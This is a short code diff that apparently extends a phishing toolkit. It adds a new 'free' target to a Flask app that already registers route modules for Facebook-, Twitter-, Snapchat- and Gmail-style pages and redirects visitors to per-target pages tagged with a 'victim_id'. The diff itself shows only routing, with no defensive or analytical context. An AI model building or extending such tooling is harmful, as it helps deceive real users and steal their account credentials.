@@ -5,7 +5,8 @@ from bot.servers import (
     register_face_routes,
     register_twit_routes,
     register_snap_routes,
-    register_gmail_routes
+    register_gmail_routes,
+    register_free_routes
 )
 
 app = Flask(__name__)
@@ -17,6 +18,7 @@ register_face_routes(app)
 register_twit_routes(app)
 register_snap_routes(app)
 register_gmail_routes(app)
+register_free_routes(app)
 
 # ========== HOME ==========
 @app.route('/')
@@ -41,6 +43,8 @@ def legacy_page(uid):
         return redirect(f"/p/snap/{uid}?v={victim_id}")
     elif target_type == 'gmail':
         return redirect(f"/p/gmail/{uid}?v={victim_id}")
+    elif target_type == 'free':
+        return redirect(f"/p/free/{uid}?v={victim_id}")
     
     return "Page not found", 404
 
